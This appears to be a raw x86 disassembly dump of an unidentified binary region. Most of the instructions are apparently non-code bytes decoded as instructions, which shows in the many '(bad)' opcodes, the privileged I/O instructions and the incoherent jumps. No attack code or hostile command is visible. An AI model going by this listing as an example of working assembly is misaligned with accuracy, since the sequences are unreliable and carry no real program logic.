  426c25:	add    BYTE PTR [ecx+0x0],cl
  426c28:	push   ebp
  426c29:	add    BYTE PTR [eax+eax*1+0x49],al
  426c2d:	add    BYTE PTR [edi+0x0],cl
  426c30:	ins    BYTE PTR es:[edi],dx
  426c31:	add    BYTE PTR [edx+0x0],ch
  426c34:	imul   eax,DWORD PTR [eax],0x64
  426c37:	add    BYTE PTR [eax],al
  426c39:	add    dl,bh
  426c3b:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426c3f:	cli    
  426c40:	jne    0x426cb3
	...
  426c4a:	sahf   
  426c4b:	cmp    al,BYTE PTR [edx+0x0]
  426c4e:	pop    ecx
  426c4f:	dec    edi
  426c50:	pop    edi
  426c51:	dec    edi
  426c52:	inc    eax
  426c53:	dec    edi
  426c54:	inc    esp
  426c55:	dec    edi
  426c56:	pop    edi
  426c57:	dec    edi
  426c58:	inc    esi
  426c59:	dec    edi
  426c5a:	add    DWORD PTR [edi+0x0],ecx
  426c5d:	dec    edi
  426c5e:	xor    cl,BYTE PTR [edi+0x0]
  426c61:	add    BYTE PTR [ebp+0x4f],bl
  426c64:	pop    esi
  426c65:	dec    edi
  426c66:	pop    ebx
  426c67:	dec    edi
  426c68:	add    DWORD PTR [edi+0x0],ecx
  426c6b:	dec    edi
  426c6c:	xor    cl,BYTE PTR [edi+0x4f]
  426c6f:	dec    edi
  426c70:	inc    ecx
  426c71:	dec    edi
  426c72:	pop    edi
  426c73:	dec    edi
  426c74:	inc    eax
  426c75:	dec    edi
  426c76:	add    DWORD PTR [edi+0x0],ecx
  426c79:	dec    edi
  426c7a:	xor    cl,BYTE PTR [edi+0x0]
  426c7d:	add    BYTE PTR [ecx+0x4f],al
  426c80:	pop    edx
  426c81:	dec    edi
  426c82:	inc    esi
  426c83:	dec    edi
  426c84:	dec    ebp
  426c85:	dec    edi
  426c86:	push   ebx
  426c87:	dec    edi
  426c88:	inc    edx
  426c89:	dec    edi
  426c8a:	pop    ebx
  426c8b:	dec    edi
  426c8c:	xor    cl,BYTE PTR [edi+0x0]
  426c8f:	add    BYTE PTR [eax],al
  426c91:	add    BYTE PTR [esi+0x7d],ch
  426c94:	outs   dx,BYTE PTR ds:[esi]
  426c95:	lea    ebp,[esi-0x63]
  426c98:	outs   dx,BYTE PTR ds:[esi]
  426c99:	lods   eax,DWORD PTR ds:[esi]
  426c9a:	outs   dx,BYTE PTR ds:[esi]
  426c9b:	mov    ebp,0xdd6ecd6e
  426ca0:	outs   dx,BYTE PTR ds:[esi]
  426ca1:	in     eax,dx
  426ca2:	outs   dx,BYTE PTR ds:[esi]
  426ca3:	std    
  426ca4:	outs   dx,BYTE PTR ds:[esi]
  426ca5:	or     eax,0x2d6e1d6e
  426caa:	outs   dx,BYTE PTR ds:[esi]
  426cab:	cmp    eax,0x6d6e5d6e
  426cb0:	outs   dx,BYTE PTR ds:[esi]
  426cb1:	jb     0x426d21
  426cb3:	jae    0x426d23
  426cb5:	jo     0x426d25
  426cb7:	jno    0x426d27
  426cb9:	jbe    0x426d29
  426cbb:	ja     0x426d2b
  426cbd:	je     0x426d2d
  426cbf:	jne    0x426d2f
  426cc1:	mov    ch,BYTE PTR [esi-0x75]
  426cc4:	outs   dx,BYTE PTR ds:[esi]
  426cc5:	mov    BYTE PTR [esi-0x77],ch
  426cc8:	outs   dx,BYTE PTR ds:[esi]
  426cc9:	mov    gs,WORD PTR [esi+0x7c]
  426ccc:	pop    esi
  426ccd:	jge    0x426d1d
  426ccf:	jge    0x426c8f
  426cd1:	jge    0x426d2f
  426cd3:	(bad)  
  426cd4:	jge    0x426d46
  426cd6:	mov    ebp,0x71736eb1
  426cdb:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  426ce1:	add    BYTE PTR [ebp+0x17],cl
  426ce4:	mov    ebx,0x4af4bd56
  426ce9:	aaa    
  426cea:	dec    edx
  426ceb:	jle    0x426c8a
  426ced:	jno    0x426d43
  426cef:	mov    cl,0x8
  426cf1:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  426cf9:	xlat   BYTE PTR ds:[ebx]
  426cfa:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  426d00:	ret    
  426d01:	fidiv  WORD PTR [edi]
  426d03:	into   
  426d04:	mul    BYTE PTR [esi+0x1faa3204]
  426d0a:	push   0xc5c644f1
  426d0f:	sbb    ch,al
  426d11:	jno    0x426d13
  426d13:	add    BYTE PTR [eax],al
  426d15:	add    dh,ch
  426d17:	(bad)  [ebx+0x7]
  426d1a:	mov    dh,0x6b
  426d1c:	inc    edx
  426d1d:	add    BYTE PTR [edi+ebx*1],dh
  426d20:	mov    al,0x22
  426d22:	int3   
  426d23:	push   ecx
  426d24:	inc    edx
  426d25:	add    BYTE PTR [ecx+0x6b],bh
  426d28:	dec    edx
  426d29:	jae    0x426d79
  426d2b:	imul   eax,DWORD PTR [edx+0x0],0xffffffb2
  426d2f:	imul   eax,DWORD PTR [edx+0x0],0xffffff8e
  426d33:	in     eax,dx
  426d34:	adc    al,BYTE PTR [edi]
	...
  426d56:	addr16 push ebx
  426d58:	push   ecx
  426d59:	pop    eax
  426d5a:	jb     0x426dd6
  426d5c:	inc    esp
  426d5d:	inc    ecx
  426d5e:	dec    edx
  426d5f:	imul   esi,DWORD PTR [ecx+0x56],0x54695055
  426d66:	dec    esi
  426d67:	inc    edx
  426d68:	dec    esi
  426d69:	imul   eax,DWORD PTR [eax],0x0
	...
  426d7c:	add    BYTE PTR [eax],al
  426d7e:	push   0x73
  426d80:	dec    eax
  426d81:	inc    edx
  426d82:	outs   dx,BYTE PTR ds:[esi]
  426d83:	jno    0x426dff
  426d85:	inc    ecx
  426d86:	dec    ebx
  426d87:	jno    0x426e02
  426d89:	imul   ecx,DWORD PTR [edx+0x73],0x7a
  426d8d:	je     0x426dde
  426d8f:	jo     0x426de8
  426d91:	dec    edx
  426d92:	ins    BYTE PTR es:[edi],dx
  426d93:	popa   
  426d94:	inc    ecx
  426d95:	inc    ebx
  426d96:	ja     0x426dde
  426d98:	inc    ebx
  426d99:	add    BYTE PTR gs:[eax],al
  426d9c:	push   eax
  426d9d:	push   esi
  426d9e:	dec    ebp
  426d9f:	popa   
  426da0:	pop    eax
  426da1:	addr16 dec edi
  426da3:	popa   
  426da4:	outs   dx,BYTE PTR ds:[esi]
  426da5:	pop    edx
  426da6:	ins    BYTE PTR es:[edi],dx
  426da7:	inc    edi
  426da8:	add    BYTE PTR [eax],al
  426daa:	dec    ebp
  426dab:	push   ebp
  426dac:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  426db2:	mov    esp,ebp
  426db4:	or     al,ah
  426db6:	dec    ebp
  426db7:	add    bh,al
  426db9:	add    BYTE PTR [eax],cl
  426dbb:	add    BYTE PTR [eax],al
  426dbd:	mov    DWORD PTR [eax],0x3ef44545
  426dc3:	cmp    BYTE PTR [eax],al
  426dc5:	test   DWORD PTR [ebx-0x34070b64],ecx
  426dcb:	(bad)  
  426dcc:	enter  0x4d45,0xb8
  426dd0:	mov    edi,DWORD PTR [ecx]
  426dd2:	hlt    
  426dd3:	test   ebx,ecx
  426dd5:	pushf  
  426dd6:	enter  0x4df8,0x8b
  426dda:	mov    DWORD PTR [ebp+0x8],0x894708
  426de1:	inc    ebp
  426de2:	mov    ebp,0xff8bfffc
  426de7:	dec    ebp
  426de8:	mov    ch,0xf4
  426dea:	call   DWORD PTR [ebx-0x1]
  426ded:	mov    ebx,0x8005022
  426df2:	call   DWORD PTR [ecx+0x8]
  426df5:	pop    es
  426df6:	jmp    0xb8:0x9cb4533
  426dfd:	cwde   
  426dfe:	mov    esi,DWORD PTR [edx-0xc]
  426e01:	xor    al,bl
  426e03:	add    BYTE PTR [eax+0x3c83203],bl
  426e09:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  426e0f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  426e15:	xor    eax,DWORD PTR [eax]
  426e17:	retf   
  426e18:	ret    
  426e19:	add    eax,esi
  426e1b:	enter  0x8945,0x64
  426e1f:	dec    ebp
  426e20:	sbb    ah,cl
  426e22:	add    BYTE PTR [ebx-0xb87b277],cl
  426e28:	dec    DWORD PTR [ebx-0xbcfb275]
  426e2e:	test   DWORD PTR [ebx],esi
  426e30:	dec    ebx
  426e32:	inc    DWORD PTR [ebx]
  426e34:	inc    eax
  426e35:	enter  0x8989,0x64
  426e39:	(bad)  
  426e3a:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  426e3e:	cld    
  426e3f:	dec    DWORD PTR [ebp-0xa90001]
  426e45:	push   edi
  426e46:	mov    BYTE PTR [edx+0x1],ch
  426e49:	and    BYTE PTR [eax],al
  426e4b:	pop    ecx
  426e4c:	inc    ebp
  426e4d:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  426e53:	push   0xffffff89
  426e55:	pop    ecx
  426e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e57:	dec    ebp
  426e58:	add    BYTE PTR [ecx+0x45fc088b],cl
  426e5e:	jne    0x426ea8
  426e60:	lea    eax,[eax]
  426e62:	fs (bad) 
  426e64:	dec    DWORD PTR [eax]
  426e66:	mov    DWORD PTR [eax],eax
  426e68:	test   al,0x0
  426e6a:	add    BYTE PTR [ebp-0x18],cl
  426e6d:	xor    ebp,DWORD PTR [edx]
  426e6f:	add    eax,DWORD PTR [eax]
  426e71:	mov    eax,eax
  426e73:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  426e7a:	inc    ebp
  426e7b:	mov    DWORD PTR [ebx+0x459408],ecx
  426e81:	popa   
  426e82:	mov    esp,DWORD PTR [ebp-0x75]
  426e85:	(bad)  
  426e86:	cld    
  426e87:	inc    eax
  426e88:	cmp    bh,0x1
  426e8b:	lea    eax,[eax]
  426e8d:	and    BYTE PTR [eax],al
  426e8f:	inc    DWORD PTR [ecx-0x18]
  426e92:	mov    ecx,DWORD PTR [ebx]
  426e94:	cld    
  426e95:	add    BYTE PTR [ecx+0x75014d],cl
  426e9b:	(bad)  
  426e9c:	xchg   ebp,eax
  426e9d:	sar    bh,1
  426e9f:	inc    eax
  426ea0:	inc    DWORD PTR [eax]
  426ea2:	mov    eax,DWORD PTR [ebp-0x4]
  426ea5:	xor    edx,DWORD PTR [edx+0x7201be]
  426eab:	add    BYTE PTR [edx],dl
  426ead:	(bad)  
  426eae:	nop
  426eaf:	inc    ebp
  426eb0:	add    BYTE PTR [ebx-0x5afb0c00],cl
  426eb6:	mov    al,0xff
  426eb8:	add    bh,bh
  426eba:	add    BYTE PTR [ebx],dh
  426ebc:	inc    DWORD PTR [ebx]
  426ebe:	sbb    al,0x89
  426ec0:	jne    0x426e9e
  426ec2:	mov    esp,DWORD PTR [ecx+0x4500fc]
  426ec8:	mov    eax,DWORD PTR [ebp-0xff0048]
  426ece:	mov    DWORD PTR [eax-0x70],0xee70ed89
  426ed5:	inc    DWORD PTR [ebp-0x75]
  426ed8:	fisttp QWORD PTR [eax+ebp*8]
  426edb:	test   DWORD PTR [esi-0x1],esp
  426ede:	inc    ebp
  426edf:	(bad)  
  426ee0:	aas    
  426ee1:	inc    ebp
  426ee2:	(bad)  
  426ee3:	lea    edi,[eax+edi*2-0x1]
  426ee7:	inc    edi
  426ee9:	mov    DWORD PTR ds:0x8000c7a0,edi
  426eef:	mov    ebp,esi
  426ef1:	cld    
  426ef2:	in     al,0x8d
  426ef4:	inc    ebp
  426ef5:	(bad)  
  426ef6:	call   0xc7cb4efa
  426efb:	add    DWORD PTR [eax-0x11ba1500],ecx
  426f01:	inc    DWORD PTR [ebp-0x4]
  426f04:	out    0x8d,eax
  426f06:	aas    
  426f07:	(bad)  
  426f08:	call   0xca9a0c
  426f0d:	add    DWORD PTR [ebx-0x7f570400],ecx
  426f13:	add    BYTE PTR [ecx],al
  426f15:	test   DWORD PTR [eax],eax
  426f17:	wrmsr  
  426f19:	jae    0x426f08
  426f1b:	add    BYTE PTR [eax],al
  426f1d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  426f23:	add    esp,edi
  426f25:	add    BYTE PTR [eax+0x450108],al
  426f2b:	mov    edi,DWORD PTR [ebp-0x6c]
  426f2e:	add    DWORD PTR [eax],0x4
  426f31:	mov    eax,DWORD PTR [ebp+0x3]
  426f34:	mov    edi,DWORD PTR [esp+edi*8]
  426f37:	dec    ebp
  426f38:	nop
  426f39:	mov    eax,DWORD PTR [ecx]
  426f3b:	fadd   DWORD PTR [eax]
  426f3d:	add    BYTE PTR [esi],al
  426f3f:	lea    eax,[eax]
  426f41:	pusha  
  426f42:	push   eax
  426f43:	inc    DWORD PTR [ebp+0x52]
  426f46:	call   DWORD PTR [ebp-0x7b]
  426f49:	mov    esi,DWORD PTR [ebp-0x74]
  426f4c:	mov    eax,DWORD PTR [eax]
  426f4e:	cld    
  426f4f:	mov    eax,DWORD PTR [eax+0x880103]
  426f55:	add    BYTE PTR [ebp+0x6a],bh
  426f58:	cmp    edi,0x10
  426f5b:	mov    WORD PTR [ebp+0x0],es
  426f5e:	mov    edx,DWORD PTR [edx-0x4]
  426f61:	push   ecx
  426f62:	nop
  426f63:	inc    DWORD PTR [ecx]
  426f65:	cld    
  426f66:	add    BYTE PTR [ebp-0x24],bh
  426f69:	mov    eax,DWORD PTR [eax]
  426f6b:	cld    
  426f6c:	push   eax
  426f6d:	nop
  426f6e:	inc    ebp
  426f6f:	add    edi,edi
  426f71:	add    BYTE PTR [ebx+0x4de4f445],cl
  426f77:	in     al,dx
  426f78:	xor    eax,edi
  426f7a:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  426f81:	mov    DWORD PTR [eax],0xb8788b98
  426f87:	test   ebx,eax
  426f89:	jmp    FWORD PTR [eax-0x1]
  426f8c:	int    0xed
  426f8e:	sub    esp,eax
  426f90:	add    eax,DWORD PTR [ebp-0x30]
  426f93:	fild   WORD PTR [ebp+0x3f]
  426f96:	cmp    eax,edi
  426f98:	je     0xca434fba
  426f9e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  426fa5:	(bad)  
  426fa6:	jne    0x426f34
  426fa8:	mov    ebx,ebp
  426faa:	cld    
  426fab:	js     0x426ff2
  426fad:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  426fb3:	inc    ebp
  426fb4:	call   0xea9944
  426fb9:	add    BYTE PTR [ebx-0x7f170301],cl
  426fbf:	add    DWORD PTR es:[eax],eax
  426fc2:	add    al,al
  426fc4:	xor    BYTE PTR [eax+0x41],dl
  426fc7:	inc    ebp
  426fc8:	add    BYTE PTR [ebx+0xfcd88b],cl
  426fce:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  426fd4:	add    DWORD PTR [ecx+0x458be845],ecx
  426fda:	fmul   DWORD PTR [ebx+0x8bb800]
  426fe0:	cld    
  426fe1:	call   0xd79aa6
  426fe6:	dec    DWORD PTR [ebx+0x1090e8ff]
  426fec:	add    al,al
  426fee:	push   eax
  426fef:	es inc ebp
  426ff1:	inc    ebp
  426ff2:	mov    ecx,DWORD PTR [ebx+0xd89c]
  426ff8:	dec    DWORD PTR [ebx-0x3ff70301]
  426ffe:	mov    DWORD PTR gs:[eax],eax
  427001:	call   0x8b6ab5c6
  427006:	inc    ebp
  427007:	mov    eax,0xe8d8008b
  42700c:	add    BYTE PTR [ecx],ch
  42700e:	mov    eax,DWORD PTR [eax]
  427010:	cld    
  427011:	mov    eax,eax
  427013:	call   0x462a806d
  427018:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42701e:	cld    
  42701f:	mov    BYTE PTR [eax+0x8401c1],0x1
  427026:	xor    BYTE PTR [eax],al
  427028:	push   edi
  427029:	inc    ebp
  42702a:	mov    DWORD PTR [ebx],esi
  42702c:	in     al,0xb9
  42702e:	inc    ebp
  42702f:	lea    ecx,[ebx-0x3c370301]
  427035:	dec    ebp
  427036:	cwde   
  427037:	mov    esi,DWORD PTR [edx]
  427039:	or     BYTE PTR [ebx],al
  42703b:	ror    DWORD PTR [ebp-0xfebf79],0x0
  427042:	call   0x42998c
  427047:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  42704d:	jge    0x427082
  42704f:	mov    eax,DWORD PTR [ebx]
  427051:	cld    
  427052:	lea    edx,[eax+0xff0120]
  427058:	call   0x4299ec
  42705d:	push   eax
  42705e:	inc    DWORD PTR [ebp-0x1c]
  427061:	mov    ecx,DWORD PTR [ebp-0x58]
  427064:	xor    eax,DWORD PTR [eax]
  427066:	add    edi,edi
  427068:	cmp    ebp,eax
  42706a:	jne    0x427092
  42706c:	mov    DWORD PTR [eax],0x8b004dd8
  427072:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427079:	mov    eax,ebx
  42707b:	cld    
  42707c:	test   BYTE PTR [eax+0x320198],bh
  427082:	mov    DWORD PTR [ebp+0x8],esi
  427085:	xor    eax,DWORD PTR [ebp-0x73]
  427088:	test   DWORD PTR [esp+esi*2-0x1],edi
  42708c:	mov    ebp,eax
  42708e:	mov    eax,0x33004d29
  427093:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427099:	add    DWORD PTR [eax],eax
  42709b:	add    BYTE PTR [ebp+0x30],al
  42709e:	mov    edx,DWORD PTR [edi-0x48]
  4270a1:	add    ebx,0xffffffe4
  4270a4:	push   0x2b74cd85
  4270a9:	mov    eax,DWORD PTR [ebx]
  4270ab:	cld    
  4270ac:	sar    BYTE PTR [eax+0x3b0145],1
  4270b2:	pcmpeqw mm4,mm6
  4270b5:	xor    edi,edi
  4270b7:	lea    ecx,[ebx-0x239c7470]
  4270bd:	add    BYTE PTR [ebp+0x50],cl
  4270c0:	cmp    eax,DWORD PTR [ebp+0x75]
  4270c3:	mov    ebp,DWORD PTR [eax-0x68]
  4270c6:	test   DWORD PTR [eax],eax
  4270c8:	clc    
  4270c9:	push   DWORD PTR [ebp-0x1]
  4270cc:	lea    ecx,[eax]
  4270ce:	int3   
  4270cf:	inc    ebp
  4270d0:	call   0xfaa160
  4270d5:	jne    0x4270cf
  4270d7:	xor    edi,DWORD PTR [ebp-0x41]
  4270da:	jmp    0x42714e
  4270dc:	mov    eax,DWORD PTR [eax]
  4270de:	mov    eax,0x339545c7
  4270e3:	inc    DWORD PTR [ebx]
  4270e5:	push   DWORD PTR [ecx]
  4270e7:	aaa    
  4270e8:	mov    eax,DWORD PTR [eax]
  4270ea:	jmp    0x42713c
  4270ec:	mov    eax,DWORD PTR [ebp-0x3c]
  4270ef:	mov    eax,eax
  4270f1:	cld    
  4270f2:	clc    
  4270f3:	ret    
  4270f4:	test   bh,al
  4270f6:	pop    es
  4270f7:	xchg   ebp,eax
  4270f8:	add    bh,bh
  4270fa:	inc    ebp
  4270fb:	dec    DWORD PTR [edi]
  4270fd:	and    DWORD PTR [ebx],ebp
  4270ff:	add    BYTE PTR [eax],al
  427101:	push   eax
  427102:	jbe    0x427159
  427104:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42710a:	or     al,0xcf
  42710c:	inc    eax
  42710d:	enter  0x745,0x72
  427111:	inc    ebp
  427112:	mov    eax,DWORD PTR [ecx]
  427114:	int3   
  427115:	add    BYTE PTR [ebp-0x75],al
  427118:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42711e:	ror    BYTE PTR [ebp+0x72f80885],1
  427124:	inc    ebp
  427125:	add    BYTE PTR [ebx-0x3c7423bb],cl
  42712b:	fadd   st,st(6)
  42712d:	rol    BYTE PTR [ebp+0x12],0x8b
  427131:	inc    ebp
  427132:	fmul   QWORD PTR [ebx-0x3c39233d]
  427138:	inc    ebp
  427139:	test   bh,al
  42713b:	cwde   
  42713c:	clc    
  42713d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  427143:	inc    ebp
  427144:	cmp    dh,BYTE PTR [ebx]
  427146:	pushf  
  427147:	mov    ecx,0xffb48dc7
  42714c:	test   eax,ecx
  42714e:	clc    
  42714f:	dec    ebp
  427150:	inc    ebp
  427151:	mov    edi,DWORD PTR [eax+ecx*1]
  427154:	pushf  
  427155:	rol    edi,0x86
  427158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427159:	inc    BYTE PTR [ebp+0x45f7f8ff]
  42715f:	inc    ebp
  427160:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427168:	test   DWORD PTR [eax],edi
  42716a:	clc    
  42716b:	pushf  
  42716c:	inc    ebp
  42716d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427173:	push   eax
  427174:	(bad)  
  427175:	cld    
  427176:	jge    0x427178
  427178:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42717e:	add    BYTE PTR [ebx],dl
  427180:	jmp    0xcd72d2
  427185:	les    eax,FWORD PTR [ebp-0x35]
  427188:	mov    ecx,esi
  42718a:	lock or al,cl
  42718d:	clc    
  42718e:	inc    ebp
  42718f:	add    esi,DWORD PTR [ebx]
  427191:	jge    0x427196
  427193:	xor    edi,DWORD PTR [ebx]
  427195:	cmp    ecx,DWORD PTR [edi]
  427197:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42719c:	mov    edi,DWORD PTR [ecx]
  42719e:	test   al,0xcc
  4271a0:	dec    ebp
  4271a1:	test   BYTE PTR [ebx],dh
  4271a3:	pop    es
  4271a4:	xor    eax,DWORD PTR [eax]
  4271a6:	add    ecx,DWORD PTR [esi]
  4271a8:	add    ecx,eax
  4271aa:	psraw  mm0,mm1
  4271ad:	sub    BYTE PTR [ebp+0x38],cl
  4271b0:	mov    edi,DWORD PTR [ebx]
  4271b2:	lock int3 
  4271b4:	shl    edx,1
  4271b6:	rol    BYTE PTR [ebp+0xc],1
  4271b9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4271c0:	jmp    0x7b720a
  4271c5:	pushf  
  4271c6:	inc    ebp
  4271c7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4271cd:	xor    ecx,ebx
  4271cf:	add    ecx,esi
  4271d1:	mov    esi,eax
  4271d3:	enter  0x45af,0x8b
  4271d7:	xor    ecx,eax
  4271d9:	add    edx,DWORD PTR [ebp-0x77]
  4271dc:	sub    ecx,DWORD PTR [eax]
  4271de:	cmp    eax,DWORD PTR [ebp+0x77]
  4271e1:	fmul   DWORD PTR [ebx-0x76385764]
  4271e7:	test   al,0x0
  4271e9:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4271ef:	cmp    esi,DWORD PTR [ebx]
  4271f1:	pushf  
  4271f2:	xor    eax,edi
  4271f4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4271fb:	inc    ebp
  4271fc:	dec    ebp
  4271fd:	cmp    eax,0xc7f09c8b
  427202:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427209:	inc    ebp
  42720a:	jmp    0x42724b
  42720c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427213:	dec    ebp
  427214:	xor    esi,DWORD PTR [ebx]
  427216:	add    eax,DWORD PTR [ebx]
  427218:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42721e:	dec    ebp
  42721f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  427225:	out    dx,eax
  427226:	rol    BYTE PTR [eax],1
  427228:	add    eax,0xebc8458b
  42722d:	dec    ebp
  42722e:	mov    ebp,DWORD PTR [ebx]
  427230:	mov    esp,0x33f84d8b
  427235:	ret    
  427236:	xor    eax,esi
  427238:	add    ecx,eax
  42723a:	add    eax,DWORD PTR [edx+0xc1010f]
  427240:	dec    ebp
  427241:	inc    ebp
  427242:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  427248:	ror    bl,1
  42724a:	add    eax,0xebc645ce
  42724f:	scas   eax,DWORD PTR es:[edi]
  427250:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  427256:	xor    ebp,DWORD PTR [ebx]
  427258:	xor    edi,DWORD PTR [ebx]
  42725a:	add    esi,DWORD PTR [edi+0x3]
  42725d:	mov    ecx,DWORD PTR [edi]
  42725f:	clc    
  427260:	rol    ebx,0x4d
  427263:	(bad)  
  427264:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42726b:	mov    ah,0x45
  42726d:	dec    ebp
  42726e:	jbe    0x4272a3
  427270:	mov    esi,DWORD PTR [ebx]
  427272:	call   0x3345bf7a
  427277:	rdpmc  
  427279:	rol    DWORD PTR [ebx],0x4d
  42727c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427282:	inc    ebp
  427283:	ror    BYTE PTR [ebx+0x45450808],1
  427289:	jmp    0x10a7319
  42728e:	inc    ebp
  42728f:	inc    ebp
  427290:	(bad)  
  427291:	mov    ebx,eax
  427293:	clc    
  427294:	test   ebx,eax
  427296:	clc    
  427297:	retf   
  427298:	inc    ebp
  427299:	into   
  42729a:	mov    esi,0x8b85afec
  4272a0:	clc    
  4272a1:	enter  0x5545,0x3a
  4272a5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4272ac:	ret    
  4272ad:	mov    ah,0xc6
  4272af:	addr16 push 0x338b4545
  4272b5:	clc    
  4272b6:	add    eax,ebx
  4272b8:	loopne 0x427285
  4272ba:	dec    ebp
  4272bb:	into   
  4272bc:	mov    al,dh
  4272be:	or     BYTE PTR [edi-0x37ff748e],ch
  4272c4:	inc    ebp
  4272c5:	push   ebp
  4272c6:	mov    ebp,DWORD PTR [ebx]
  4272c8:	in     al,dx
  4272c9:	cmp    eax,ebx
  4272cb:	ja     0x427312
  4272cd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4272d3:	inc    ebp
  4272d4:	cwde   
  4272d5:	mov    esi,DWORD PTR [edx]
  4272d7:	clc    
  4272d8:	mov    bl,al
  4272da:	xlat   BYTE PTR ds:[ebx]
  4272db:	retf   
  4272dc:	inc    ebp
  4272dd:	into   
  4272de:	mov    eax,esi
  4272e0:	in     al,dx
  4272e1:	scas   eax,DWORD PTR es:[edi]
  4272e2:	retf   
  4272e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4272e6:	mov    edx,DWORD PTR [ebp-0x24]
  4272e9:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  4272f0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4272f7:	mov    eax,DWORD PTR [ebx]
  4272f9:	clc    
  4272fa:	loopne 0x4272bf
  4272fc:	push   ebp
  4272fd:	retf   
  4272fe:	mov    dh,al
  427300:	adc    esi,ecx
  427302:	jb     0x4272b3
  427304:	add    BYTE PTR [ebx+0x558bc845],cl
  42730a:	in     al,dx
  42730b:	sub    eax,ebx
  42730d:	cmp    ecx,ebx
  42730f:	mov    eax,esi
  427311:	mov    esp,0x45af03ce
  427316:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42731c:	mov    eax,ebx
  42731e:	in     al,dx
  42731f:	into   
  427320:	dec    ebp
  427321:	(bad)  
  427322:	xor    ebp,DWORD PTR [edi+0x80f8903]
  427328:	rol    DWORD PTR [ebp+0x4d],0x89
  42732c:	xor    esp,esp
  42732e:	sub    eax,DWORD PTR [ebp-0x75]
  427331:	add    ebp,esp
  427333:	mov    al,0x55
  427335:	inc    ebp
  427336:	xor    edi,DWORD PTR [eax]
  427338:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  42733f:	inc    ebp
  427340:	xor    edi,DWORD PTR [ecx]
  427342:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  427349:	test   DWORD PTR [eax],eax
  42734b:	clc    
  42734c:	enter  0x8645,0x33
  427350:	inc    DWORD PTR [ebx]
  427352:	(bad)  
  427353:	jmp    0x42739a
  427355:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  42735b:	inc    ebp
  42735c:	(bad)  
  42735d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427363:	cwde   
  427364:	retf   
  427365:	xor    al,cl
  427367:	mov    BYTE PTR [ebp+0xb],cl
  42736a:	lea    eax,[ebp+0x8]
  42736d:	xor    esi,DWORD PTR [edx+0x3]
  427370:	add    al,ah
  427372:	inc    ebp
  427373:	dec    ebp
  427374:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42737a:	push   0x2b45cd00
  42737f:	mov    al,BYTE PTR [ebx]
  427381:	or     esi,eax
  427383:	dec    ebp
  427384:	inc    ebp
  427385:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42738b:	push   ebp
  42738c:	(bad)  
  42738d:	mov    BYTE PTR [edi+0xf723b11],ch
  427393:	add    ch,ch
  427395:	inc    ebp
  427396:	dec    DWORD PTR [ebx-0x34332775]
  42739c:	add    al,0x4d
  42739e:	inc    ebp
  42739f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4273a5:	cwde   
  4273a6:	add    DWORD PTR [edx],esi
  4273a8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4273ae:	push   DWORD PTR [ebx]
  4273b0:	int3   
  4273b1:	xor    eax,DWORD PTR [eax]
  4273b3:	add    edx,DWORD PTR [eax+0x3]
  4273b6:	mov    DWORD PTR [edi],ecx
  4273b8:	call   0x4288347e
  4273bd:	mov    DWORD PTR [ebp-0x20],esp
  4273c0:	add    BYTE PTR [ebp+0x7d],al
  4273c3:	mov    eax,DWORD PTR [eax]
  4273c5:	in     al,0x15
  4273c7:	ret    
  4273c8:	iret   
  4273c9:	(bad)  
  4273ca:	enter  0x14af,0x8b
  4273ce:	(bad)  
  4273cf:	in     al,dx
  4273d0:	or     bl,cl
  4273d2:	adc    cl,al
  4273d4:	push   ebp
  4273d5:	dec    ebp
  4273d6:	inc    eax
  4273d7:	mov    edx,DWORD PTR [ebp-0x20]
  4273da:	jb     0x4273a7
  4273dc:	mov    ecx,esi
  4273de:	cld    
